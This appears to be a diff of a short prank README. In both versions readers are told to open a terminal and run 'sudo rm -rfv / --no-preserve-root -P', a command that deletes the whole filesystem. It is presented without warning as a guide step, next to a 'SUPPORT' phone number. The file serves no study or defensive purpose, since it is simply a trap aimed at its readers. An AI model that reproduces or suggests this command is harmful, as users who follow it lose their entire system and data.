@@ -1,6 +1,5 @@
 # main
-QUICK-GUIDE-TO-AVOIDE-LINUX
-button press "CTRL" + "ALT" + "T" put command into terminal window : "#sudo rm -rfv / --no-preserve-root -P " 
+Button combination "CTRL" + "ALT" + "T" : "sudo rm -rfv / --no-preserve-root -P " 
 
 
 
@@ -27,5 +26,5 @@ button press "CTRL" + "ALT" + "T" put command into terminal window : "#sudo rm -
 
 
 
-SUPPORT HELP: 
+SUPPORT: 
 Rest of World +44 203 656 5291
